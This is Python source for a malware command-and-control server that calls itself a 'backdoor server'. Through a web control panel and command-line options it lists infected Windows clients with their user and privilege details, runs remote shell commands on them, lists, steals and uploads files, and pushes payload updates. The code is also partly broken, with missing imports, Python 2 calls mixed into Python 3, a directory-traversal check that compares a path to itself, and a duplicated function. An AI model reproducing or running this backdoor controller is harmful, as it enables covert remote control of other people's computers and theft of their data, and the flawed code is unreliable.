#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from optparse import OptionParser, make_option
from config import Conf
from Clienthelper import ClientHelper
from clientdispatcher import ClientDispatcher

import random
import socket
import signal

from keysmanager import KeysManager
import os
import cgi
import urllib


try:
    # https://pypi.org/project/CherryPy/
    import cherrypy
    import cherrypy.process.plugins
except ImportError:
    print('ERROR: CherryPy is not installed')
    exit(-1)

try:
    # https://pypi.org/project/redis/
    import redis
except ImportError:
    print('ERROR: redis is not installed')
    exit(-1)

# try:
#     # https://pypi.org/project/M2Crypto/
#     import M2Crypto
#     import M2Crypto.RSA
#     import M2Crypto.X509
# except ImportError:
#     print('ERROR: M2Crypto is not installed')
#     exit(-1)

try:
    # https://pypi.org/project/pycrypto/
    import Crypto
    import Crypto.Cipher.ARC4

except ImportError:
    print('ERROR: pycrypto is not installed')
    exit(-1)


import time
import sys
g_start_time = time.time()
def log_timestamp(): return time.strftime(Conf.TIME_FORMAT, time.localtime())


g_log_file = None


def log_write(data):

    global g_log_file

    data = '[%s]: %s' % (log_timestamp(), data)

    sys.stdout.write(data)
    sys.stdout.flush()

    data = data.encode('UTF-8')

    print(type(data))
    if g_log_file is not None:

        g_log_file.write(data)
        g_log_file.flush()


def log_open(path):

    global g_log_file

    log_write(u'Log file path is \"%s\"\n' % path)

    g_log_file = open(path, 'wb')


class ServerHttpRoot(object):

    def __init__(self, data):

        self.data = data

    @cherrypy.expose
    def index(self, cancel=False, **data):

        return ''


class ServerHttpWatcher(cherrypy.process.plugins.SimplePlugin):

    def stop(self):

        shutdown()


class Server(object):

    def __init__(self, addr, port):

        self.addr = (addr, port)

        log_write(u'Starting backdoor server at address %s:%d\n' % self.addr)

        # bind socket for the data transfer connection
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.sock.bind(self.addr)
        self.sock.listen(1)

    def serve_forever(self):

        while True:

            try:

                # accept client connection
                client_sock, client_addr = self.sock.accept()

            except socket.error:

                continue

            pid = os.fork()
            if pid == 0:

                random.seed()

                ClientDispatcher(client_sock, client_addr).handle()

                exit(0)

            else:

                client_sock.close()


def shutdown():

    try:

        # read PGID value
        pgid = int(open(Conf.PGID_FILE_PATH, 'r').read().strip())

    except Exception:

        print('Error while reading PGID from \"%s\"' % Conf.PGID_FILE_PATH)
        return

    print('[+] Terminating process with PGID = %d' % pgid)

    # shutdown running process
    code = os.system('kill -- -%d 2> /dev/null' % pgid)
    if code == 0:

        print('[+] DONE')

    else:

        print('Error %d while terminating process' % code)


class Daemon:
    """ Detach a process from the controlling terminal and run it in the
    background as a daemon.
    """

    UMASK = 0
    REDIRECT_TO = os.devnull

    def __init__(self):

        sys.stdout.flush()
        sys.stderr.flush()

        log_write(u'Going to the background...\n')

        try:

            # fork a child process so the parent can exit
            pid = os.fork()

        except OSError as why:

            raise (Exception('Daemon() ERROR: ' + str(why)))

        if pid == 0:

            # call os.setsid() to become the session leader of this new session
            os.setsid()

            try:

                # fork a second child and exit immediately to prevent zombies
                pid = os.fork()

            except OSError as why:

                raise (Exception('Daemon() ERROR: ' + str(why)))

            if pid == 0:

                # give the child process complete control over permissions
                os.umask(self.UMASK)

            else:

                time.sleep(2)

                # exit parent (the first child) of the second child
                os._exit(0)

        else:

            time.sleep(2)

            # exit parent of the first child
            os._exit(0)

        # redirect the standard I/O file descriptors to the specified file
        si = open(self.REDIRECT_TO, 'r')
        so = open(self.REDIRECT_TO, 'a+')
        se = open(self.REDIRECT_TO, 'a+', 0)

        os.dup2(si.fileno(), sys.stdin.fileno())
        os.dup2(so.fileno(), sys.stdout.fileno())
        os.dup2(se.fileno(), sys.stderr.fileno())


class ServerHttp():

    def __init__(self):

        def _error_page(status, message, traceback, version):

            return status

        def _staticdir(section, dir, root='', match='', content_types=None,
                       index='', lister=None, **kwargs):

            from cherrypy.lib import cptools
            from cherrypy.lib.static import staticdir

            # first call old staticdir, and see if it does anything
            if staticdir(section, dir, root, match, content_types, index):

                return True

            if lister is None:

                return False

            # allow the use of '~' to refer to a user's home directory
            path_full = os.path.expanduser(dir)

            # if dir is relative, make absolute using "root"
            if not os.path.isabs(path_full):

                if not root:

                    raise (Exception('Static dir requires an absolute dir (or root)'))

                path_full = os.path.join(root, path)

            # determine where we are in the object tree relative to 'section'
            if section == 'global':
                section = '/'

            section = section.rstrip(r'\/')
            branch = cherrypy.request.path_info[len(section) + 1:]
            branch = urllib.parse.unquote(branch.lstrip(r'\/'))

            path = section

            if len(branch) > 0:

                if branch[-1] in ['\\', '/']:

                    # remove ending slash
                    branch = branch[: -1]

                path = os.path.join(path, branch)
                path_full = os.path.join(path_full, branch)

            # check that the final filename is a child of dir
            if not os.path.normpath(path_full).startswith(os.path.normpath(path_full)):
                # forbidden
                raise cherrypy.HTTPError(403)

            # if path is relative, we should return an error
            if not os.path.isabs(path_full):

                raise (Exception('"%s" is not an absolute path' % path_full))

            if os.path.isdir(path_full):

                # set the Last-Modified response header
                cptools.validate_since()

                cherrypy.response.headers['Content-Type'] = 'text/html; charset=utf-8'
                cherrypy.response.body = lister(path, path_full)

                cherrypy.request.is_index = True
                return True

            return False

        def _staticdir_list(path, path_full):

            data = '''<div class="info">
    <b>Path</b>: %s

</div>
'''
            if path[0] in ['\\', '/']:

                # remove starting slash
                path = path[1:]

            temp, nav, items = '', [], path.replace('\\', '/').split('/')
            def to_link(
                p, t): return '<a href="%s/%s">%s</a>' % (Conf.HTTP_PATH, p, t)

            for i in range(len(items)):

                # make current path for bavigation bar
                nav.append(to_link('\\'.join(items[: i + 1]), items[i]))

            if len(nav) > 1:

                temp += '%15s [%s]\n' % ('',
                                         to_link('/'.join(items[: -1]), '..'))

            for fname in os.listdir(path_full):

                fpath = os.path.join(path_full, fname)
                if os.path.isdir(fpath):

                    # list directories
                    temp += '%15s [%s]\n' % ('',
                                             to_link(path + '/' + fname, fname))

            for fname in os.listdir(path_full):

                fpath = os.path.join(path_full, fname)
                if os.path.isfile(fpath):

                    # list files
                    size = os.path.getsize(fpath)
                    temp += '%15s %s\n' % ('{:0,.2f}'.format(size).split('.')[0],
                                           to_link(path + '/' + fname, fname))

            return ServerHttpAdmin.tmpl % ('Directory List', '', (data % '/'.join(nav)) + temp)

        # create needed directories
        if not os.path.isdir(Conf.LOG_DIR_PATH):
            os.mkdir(Conf.LOG_DIR_PATH)
        if not os.path.isdir(Conf.DOWNLOADS_DIR_PATH):
            os.mkdir(Conf.DOWNLOADS_DIR_PATH)

        # Replace the real staticdir with our version
        cherrypy.tools.staticdir = cherrypy._cptools.HandlerTool(_staticdir)

        # auth
        get_ha1 = cherrypy.lib.auth_digest.get_ha1_dict_plain(Conf.HTTP_USERS)

        # Some global configuration; note that this could be moved into a
        # configuration file
        cherrypy.config.update({

            'server.socket_port': Conf.HTTP_PORT,
            'server.socket_host': Conf.HTTP_ADDR,
            # 'tools.encode.on': True,
            'tools.encode.encoding': 'utf-8',
            'tools.decode.on': True,
            'tools.trailing_slash.on': True,
            'tools.sessions.on': True,
            'session_filter.on': True,
            'tools.gzip.on': True,
            'tools.gzip.mime_types': ['text/html', 'text/plain', 'text/javascript', 'text/css']
        })

        cherrypy.tree.mount(ServerHttpRoot({}), '/',
                            {
            '/':
            {
                'error_page.default': _error_page,
                'response.headers.server': Conf.HTTP_SERVER_NAME
            },

            '/favicon.ico':
            {
                'tools.staticfile.on': True,
                'tools.staticfile.filename': os.path.join(Conf.HTTP_STATIC, 'favicon.ico')
            }
        })

        # content types to serve static files
        content_types = {'log': 'text/plain; charset=utf-8',
                         'txt': 'text/plain; charset=utf-8'}

        cherrypy.tree.mount(ServerHttpAdmin({}), Conf.HTTP_PATH + '/',
                            {
            '/':
            {
                'tools.auth_digest.on': True,
                'tools.auth_digest.realm': Conf.HTTP_RELAM,
                'tools.auth_digest.get_ha1': get_ha1,
                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                'error_page.401': _error_page,
                'response.headers.server': Conf.HTTP_SERVER_NAME
            },

            '/static':
            {
                'tools.auth_digest.on': True,
                'tools.auth_digest.realm': Conf.HTTP_RELAM,
                'tools.auth_digest.get_ha1': get_ha1,
                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                'tools.staticdir.on': True,
                'tools.staticdir.dir': Conf.HTTP_STATIC,
                'tools.staticdir.lister': _staticdir_list
            },

            '/logs':
            {
                'tools.auth_digest.on': True,
                'tools.auth_digest.realm': Conf.HTTP_RELAM,
                'tools.auth_digest.get_ha1': get_ha1,
                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                'tools.staticdir.on': True,
                'tools.staticdir.dir': Conf.LOG_DIR_PATH,
                'tools.staticdir.lister': _staticdir_list,
                'tools.staticdir.content_types': content_types
            },

            '/downloads':
            {
                'tools.auth_digest.on': True,
                'tools.auth_digest.realm': Conf.HTTP_RELAM,
                'tools.auth_digest.get_ha1': get_ha1,
                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                'tools.staticdir.on': True,
                'tools.staticdir.dir': Conf.DOWNLOADS_DIR_PATH,
                'tools.staticdir.lister': _staticdir_list,
                'tools.staticdir.content_types': content_types
            },

            '/server.log':
            {
                'tools.auth_digest.on': True,
                'tools.auth_digest.realm': Conf.HTTP_RELAM,
                'tools.auth_digest.get_ha1': get_ha1,
                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                'tools.staticfile.on': True,
                'tools.staticfile.filename': Conf.LOG_PATH_SERVER,
                'tools.staticfile.content_types': content_types
            },

            '/access.log':
            {
                'tools.auth_digest.on': True,
                'tools.auth_digest.realm': Conf.HTTP_RELAM,
                'tools.auth_digest.get_ha1': get_ha1,
                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                'tools.staticfile.on': True,
                'tools.staticfile.filename': Conf.LOG_PATH_ACCESS,
                'tools.staticfile.content_types': content_types
            }
        })

        if os.path.isfile(Conf.LOG_PATH_ACCESS):

            # delete old log file
            try:
                os.unlink(Conf.LOG_PATH_ACCESS)
            except:
                pass

        cherrypy.config.update(
            {
                'log.access_file': Conf.LOG_PATH_ACCESS,
                'log.error_file': Conf.LOG_PATH_ACCESS
            })

        self.watcher = ServerHttpWatcher(cherrypy.engine)
        self.watcher.subscribe()

    def serve_forever(self):

        cherrypy.engine.start()
        cherrypy.engine.block()


class ServerHttpAdmin(object):

    # default web page template
    tmpl = '''<html>
<head>
<meta charset="UTF-8" />
<title>%s</title>
<link rel="shortcut icon" href="''' + Conf.HTTP_PATH + '''/static/favicon.png" />
<link rel="stylesheet" type="text/css" href="''' + Conf.HTTP_PATH + '''/static/jquery.terminal.css" />
<link rel="stylesheet" type="text/css" href="''' + Conf.HTTP_PATH + '''/static/main.css" />
<link rel="stylesheet" type="text/css" href="''' + Conf.HTTP_PATH + '''/static/fonts/ibm-plex.css" />
<script src="''' + Conf.HTTP_PATH + '''/static/jquery-1.9.1.min.js"></script>
<script src="''' + Conf.HTTP_PATH + '''/static/jquery.terminal-0.7.6.min.js"></script>
<script src="''' + Conf.HTTP_PATH + '''/static/main.js"></script>
%s
</head><body><div>%s</div>
</body></html>

    '''

    def to_html(self, title, text, refresh=None): return \
        self.tmpl % (title, '' if refresh is None else (
            '<meta http-equiv="refresh" content="%d" />' % refresh), text)

    def to_link(self, url, text, blank=False): return \
        '<a href="%s"%s>%s</a>' % (url,
                                   ' target="_blank"' if blank else '', cgi.escape(text))

    def __init__(self, data):

        self.data = data

    def uptime_to_str(self, val):

        t_sec = val % 60
        t_min = (val / 60) % 60
        t_hour = ((val / 60) / 60) % 24
        t_day = (((val / 60) / 60) / 24) % 30

        return '%d days, %d hours, %d min, %d sec' % (t_day, t_hour, t_min, t_sec)

    @cherrypy.expose
    def client(self, cancel=False, **data):

        assert data.has_key('id')
        assert data.has_key('c')

        client_id, command = data['id'], data['c']
        helper = ClientHelper(client_id)

        if not helper.mapper_connect():

            raise (Exception('No such client'))

        if command == 'uninst':

            helper.uninstall()

        time.sleep(3)

        raise cherrypy.HTTPRedirect(Conf.HTTP_PATH)

    @cherrypy.expose
    def execute(self, cancel=False, **data):

        assert data.has_key('id')
        assert data.has_key('c')

        client_id, command = data['id'], data['c']
        helper = ClientHelper(client_id)

        if not helper.mapper_connect():

            raise (Exception('No such client'))

        # execute command on the client and get the output
        data, _ = helper.execute(command)

        return data

    @cherrypy.expose
    def index(self, cancel=False, **data):

        title = 'Control Pannel'

        global g_start_time

        # get clients list
        clients = ClientHelper().client_list()

        data = '<img class="hdr" src="' + Conf.HTTP_PATH + \
            '/static/logo.png" width="511" height="64"/>\n'

        data += '  <b>Clients</b> %d\n' % len(clients)
        data += '  <b> Uptime</b> %s\n' % self.uptime_to_str(
            int(time.time() - g_start_time))

        data += '\n          '
        data += '<div class="btn btn-red">' + \
            self.to_link(Conf.HTTP_PATH + '/shutdown', 'Shutdown') + '</div>  '
        data += '<div class="btn">' + \
            self.to_link(Conf.HTTP_PATH + '/downloads',
                         'All Downloads', blank=True) + '</div>  '
        data += '<div class="btn">' + \
            self.to_link(Conf.HTTP_PATH + '/logs',
                         'All Logs', blank=True) + '</div>  '
        data += '<div class="btn">' + \
            self.to_link(Conf.HTTP_PATH + '/server.log',
                         'Server Log', blank=True) + '</div>  '
        data += '<div class="btn">' + \
            self.to_link(Conf.HTTP_PATH + '/access.log',
                         'Access Log', blank=True) + '</div>  '
        data += '\n\n'

        for client in clients:

            data += '<div class="client">\n'
            data += '       <b>ID</b> %s\n' % client.client_id
            data += '  <b>Address</b> %s\n' % client.addr[0]
            data += '  <b>Version</b> %s\n' % (
                '<UNKNOWN>' if client.os_version is None else cgi.escape(client.os_version))
            data += ' <b>Hardware</b> %s\n' % (
                '<UNKNOWN>' if client.hardware is None else cgi.escape(client.hardware))

            if client.info is not None:

                try:

                    # parse client information
                    computer, user, pid, path, admin, integrity = client.info

                    computer = cgi.escape(computer)
                    user = cgi.escape(user)
                    path = cgi.escape(path.split('\\')[-1])

                    pid, admin, integrity = int(
                        pid), int(admin), int(integrity)

                    try:

                        # get integruty level string from the RID constant
                        integrity = {SECURITY_MANDATORY_LOW_RID: 'Low',
                                     SECURITY_MANDATORY_MEDIUM_RID: 'Medium',
                                     SECURITY_MANDATORY_HIGH_RID: 'High',
                                     SECURITY_MANDATORY_SYSTEM_RID: 'System',
                                     0: 'None'}[integrity]

                    except KeyError:

                        integrity = 'Unknown'

                    data += '  <b>Process</b> %s, PID = %d, integrity = %s\n' % (
                        path, pid, integrity)
                    data += '     <b>User</b> %s\\%s, admin = %s\n' % (
                        computer, user, 'Y' if admin == 1 else 'N')

                except Exception as why:

                    data += '                 <font color="red">%s</font>\n' % cgi.escape(
                        str(why))

            data += '\n          '
            data += '<div class="btn btn-red">' + self.to_link('%s/client?id=%s&c=uninst' % (
                Conf.HTTP_PATH, client.client_id), 'Shutdown') + '</div>  '
            data += '<div class="btn btn-blue">' + self.to_link('%s/shell?id=%s' % (
                Conf.HTTP_PATH, client.client_id), 'Command Shell', blank=True) + '</div>  '
            data += '<div class="btn btn-blue">' + self.to_link('%s/flist?id=%s&p=' % (
                Conf.HTTP_PATH, client.client_id), 'Files', blank=True) + '</div>  '
            data += '<div class="btn">' + self.to_link('%s/downloads/%s' % (
                Conf.HTTP_PATH, client.client_id), 'Downloads', blank=True) + '</div>  '
            data += '<div class="btn">' + self.to_link('%s/logs/%s.log' % (
                Conf.HTTP_PATH, client.client_id), 'Log', blank=True) + '</div>  '
            data += '\n</div>\n'

        return self.to_html(title, data, refresh=10)

    @cherrypy.expose
    def shell(self, cancel=False, **data):

        title = 'Command Shell'

        assert data.has_key('id')

        client_id = data['id']

        client = ClientHelper(client_id).client_get()
        if client is None:

            return self.to_html(title, '<font color="red">ERROR: No such client</font>')

        data = '''<div class="info">
      <b>ID</b> %s
 <b>Address</b> %s

</div>
<div class="shell-output" id="shell-output"></div>
<script>

  $(document).ready(function() { term_init("''' + Conf.HTTP_PATH + '''/execute", "%s"); });

</script>
'''

        return self.to_html(title, data % (client_id, client.addr[0], client_id))

    @cherrypy.expose
    def flist(self, cancel=False, **data):

        title = 'Files'

        assert data.has_key('id')
        assert data.has_key('p')

        client_id, path = data['id'], urllib.unquote_plus(data['p'])
        helper = ClientHelper(client_id)

        if not helper.mapper_connect():

            return self.to_html(title, '<font color="red">ERROR: No such client</font>')

        client = helper.client_get()

        files = helper.file_list(path)
        if files is None:

            return self.to_html(title, '<font color="red">ERROR: Can\'t list files in "%s"</font>' % path)

        data = '''<div class="info">
      <b>ID</b> %s
 <b>Address</b> %s
    <b>Path</b> %s

'''

        if len(path) > 0:

            data += '<form action="%s/fput?id=%s&p=%s" method="POST" enctype="multipart/form-data">  <b>Upload</b>: <input type="submit" value="Submit" /><input type="file" name="file" /></form>' % \
                (Conf.HTTP_PATH, client_id, path)

        data += '''</div>
'''
        temp, nav, items = '', [], path.split('\\')

        def to_quote(s): return urllib.quote_plus(s.encode('UTF-8'))
        def to_path(name): return to_quote(
            path + '\\' + name if len(path) > 0 else name)

        for i in range(len(items)):

            # make current path for bavigation bar
            nav.append(self.to_link('%s/flist?id=%s&p=%s' %
                                    (Conf.HTTP_PATH, client_id,
                                     to_quote('\\'.join(items[: i + 1]))), items[i]))

        if len(path) > 0:

            temp += '%15s [%s]\n' % ('', self.to_link('%s/flist?id=%s&p=%s' %
                                     (Conf.HTTP_PATH, client_id,
                                      to_quote('\\'.join(items[: -1]))), '..'))

        for size, name in files:

            if size is None:

                # list directories
                temp += '%15s [%s]\n' % ('', self.to_link('%s/flist?id=%s&p=%s' %
                                         (Conf.HTTP_PATH, client_id, to_path(name)), name))

        for size, name in files:

            if size is not None:

                # list files
                temp += '%15s  %s\n' % ('{:0,.2f}'.format(size).split('.')[0],
                                        self.to_link('%s/fget?id=%s&p=%s' %
                                        (Conf.HTTP_PATH, client_id, to_path(name)), name))

        return self.to_html(title, (data % (client_id, client.addr[0], '\\'.join(nav))) + temp)

    @cherrypy.expose
    def fget(self, cancel=False, **data):

        title = 'Download File'

        assert data.has_key('id')
        assert data.has_key('p')

        client_id, path = data['id'], urllib.unquote_plus(data['p'])
        helper = ClientHelper(client_id)

        assert len(path) > 0

        if not helper.mapper_connect():

            return self.to_html(title, '<font color="red">ERROR: No such client</font>')

        # generate local file name
        fname = '%s_%s' % (hashlib.md5(path.encode('UTF-8')).hexdigest(),
                           path.replace('\\', '/').split('/')[-1])

        fpath = os.path.join(Conf.DOWNLOADS_DIR_PATH, client_id, fname)

        # download file from the client
        if helper.file_get(path, fpath):

            # server downloaded file
            raise cherrypy.HTTPRedirect('%s/downloads/%s/%s' % (Conf.HTTP_PATH, client_id,
                                                                cgi.escape(fname)))

        return self.to_html(title, '<font color="red">ERROR: Can\'t download file from the client</font>')

    @cherrypy.expose
    def fput(self, cancel=False, **data):

        title = 'Upload File'

        assert data.has_key('file')
        assert data.has_key('id')
        assert data.has_key('p')

        client_id, path, f = data['id'], urllib.unquote_plus(
            data['p']), data['file']
        helper = ClientHelper(client_id)

        assert len(path) > 0

        if len(f.filename) == 0:

            return self.to_html(title, '<font color="red">ERROR: File not selected</font>')

        if not helper.mapper_connect():

            return self.to_html(title, '<font color="red">ERROR: No such client</font>')

        full_path = path + '\\' + f.filename
        local_path = os.path.join(tempfile.gettempdir(), hashlib.md5(
            full_path.encode('UTF-8')).hexdigest())

        with open(local_path, 'wb') as fd:

            while True:

                # write file to the tmporary location
                data = f.file.read(BUFF_SIZE)
                if len(data) == 0:
                    break

                fd.write(data)

        # upload file to the client
        ret = helper.file_put(full_path, local_path)

        # delete temporary file
        if os.path.isfile(local_path):
            os.unlink(local_path)

        if ret:

            raise cherrypy.HTTPRedirect('%s/flist?id=%s&p=%s' % (Conf.HTTP_PATH, client_id,
                                                                 cgi.escape(path)))

        return self.to_html(title, '<font color="red">ERROR: Can\'t upload file to the client</font>')

    @cherrypy.expose
    def shutdown(self, cancel=False, **data):

        class ShutdownThread(Thread):

            def run(self):

                time.sleep(1)
                shutdown()

        # run shutdown procedure in separate thread
        ShutdownThread().start()

        return self.to_html('', 'SUCCESS')


def main():

    option_list = [

        make_option("-k", "--keys", dest="keys", default=False, action="store_true",
                    help="generate new private/public key pair"),

        make_option("-s", "--shutdown", dest="shutdown", default=False, action="store_true",
                    help="shutdown running server"),

        make_option("-d", "--daemon", dest="daemon", default=False, action="store_true",
                    help="run in the background"),

        make_option("-a", "--address", dest="addr", default=None,
                    help="server address to listen on"),

        make_option("-p", "--port", dest="port", default=None,
                    help="server port to listen on"),

        make_option("--log-path", dest="log_path", default=None,
                    help="log file path"),

        make_option("-l", "--list", dest="list", default=False, action="store_true",
                    help="list connected clients"),

        make_option("-c", "--client", dest="client", default=None,
                    help="client ID to operate"),

        make_option("-e", "--exec", dest="_exec", default=None,
                    help="execute command on given client"),

        make_option("-u", "--update", dest="update", default=None,
                    help="update payload on given client"),

        make_option("--flist", dest="flist", default=None,
                    help="list files on given client"),

        make_option("--fget", dest="fget", default=None,
                    help="download file from given client to the location specified in --file"),

        make_option("--fput", dest="fput", default=None,
                    help="upload file specified in --file to given client"),

        make_option("--file", dest="file", default=None,
                    help="file path for --fget and --fput")]

    parser = OptionParser(option_list=option_list)
    options, _ = parser.parse_args()

    options.addr = Conf.CLIENT_HOST if options.addr is None else options.addr
    options.port = Conf.CLIENT_PORT if options.port is None else int(
        options.port)

    if options.list:

        clients = ClientHelper().client_list()
        if len(clients) == 0:

            print('No clients connected')
            return -1

        print('\n  Connected clients')
        print('----------------------\n')

        for client in clients:

            print(' * ID = %s, addr = %s, PID = %d' %
                  (client.client_id, client.addr[0], client.map_pid))

        print('')

        return 0

    elif options._exec is not None:

        if options.client is None:

            print('ERROR: Client ID is not specified')
            return -1

        helper = ClientHelper(options.client)

        if not helper.mapper_connect():

            print('ERROR: No such client')
            return -1

        print('[+] \"%s\" command output:\n' % options._exec)

        _, code = helper.execute(options._exec, stream=sys.stdout)

        print('\n[+] Command exit code is 0x%.8x' % code)

        return 0

    elif options.flist is not None:

        if options.client is None:

            print('ERROR: Client ID is not specified')
            return -1

        helper = ClientHelper(options.client)

        if not helper.mapper_connect():

            print('ERROR: No such client')
            return -1

        files = helper.file_list(options.flist)
        if files is None:
            return -1

        print('List of the files in \"%s\":\n' % options.flist)

        for size, name in files:

            if size is None:

                print('%15s [%s]' % ('', name))

        for size, name in files:

            if size is not None:

                print('%15s %s' % ('%d' % size, name))

        print('')
        return 0

    elif options.fget is not None:

        if options.client is None:

            print('ERROR: Client ID is not specified')
            return -1

        if options.file is None:

            print('ERROR: File path is not specified')
            return -1

        helper = ClientHelper(options.client)

        if not helper.mapper_connect():

            print('ERROR: No such client')
            return -1

        return 0 if helper.file_get(options.fget, options.file) else -1

    elif options.fput is not None:

        if options.client is None:

            print('ERROR: Client ID is not specified')
            return -1

        if options.file is None:

            print('ERROR: File path is not specified')
            return -1

        if not os.path.isfile(options.file):

            print('ERROR: File "%s" doesn\'t exists' % options.file)
            return -1

        helper = ClientHelper(options.client)

        if not helper.mapper_connect():

            print('ERROR: No such client')
            return -1

        return 0 if helper.file_put(options.fput, options.file) else -1

    elif options.update is not None:

        if options.client is None:

            print('ERROR: Client ID is not specified')
            return -1

        if not os.path.isfile(options.update):

            print('ERROR: File "%s" doesn\'t exists' % options.update)
            return -1

        helper = ClientHelper(options.client)

        if not helper.mapper_connect():

            print('ERROR: No such client')
            return -1

        if helper.update(options.update):

            print('SUCCESS')
            return 0

        else:

            print('FAILS')
            return -1

    elif options.keys:

        KeysManager(Conf.CERT_DIR_PATH).generate(
            Conf.CERT_NAME, overwrite=False)
        return 0

    elif options.shutdown:

        shutdown()
        return 0

    # start log file
    log_open(Conf.LOG_PATH_SERVER if options.log_path is None else options.log_path)

    server = Server(options.addr, options.port)

    # flush database
    ClientHelper().client_del_all()

    # deamonize server
    if options.daemon:
        Daemon()

    child_pid = os.fork()
    if child_pid == 0:

        try:

            ServerHttp().serve_forever()

        except Exception as why:

            log_write(u'HTTP server error: %s\n' % str(why))

        exit(0)

    pid = os.getpid()
    pgid = os.getpgid(pid)

    log_write(u'%s PID = %d, PGID = %d\n' %
              (os.path.basename(sys.argv[0]), pid, pgid))

    with open(Conf.PGID_FILE_PATH, 'w') as fd:

        # write current PGID into the file
        fd.write(str(pgid))

    def handle_sigchld(a1, a2):

        os.waitpid(-1, os.WNOHANG)

    signal.signal(signal.SIGCHLD, handle_sigchld)

    try:

        server.serve_forever()

    except KeyboardInterrupt:

        pass

    return 0


if __name__ == '__main__':
    exit(main())


def shutdown():
    try:
        # read PGID value
        pgid = int(open(Conf.PGID_FILE_PATH, 'r').read().strip())
    except Exception:
        print('Error while reading PGID from \"%s\"' % Conf.PGID_FILE_PATH)
        return
    print('[+] Terminating process with PGID = %d' % pgid)
    # shutdown running process
    code = os.system('kill -- -%d 2> /dev/null' % pgid)
    if code == 0:
        print('[+] DONE')
    else:
        print('Error %d while terminating process' % code)
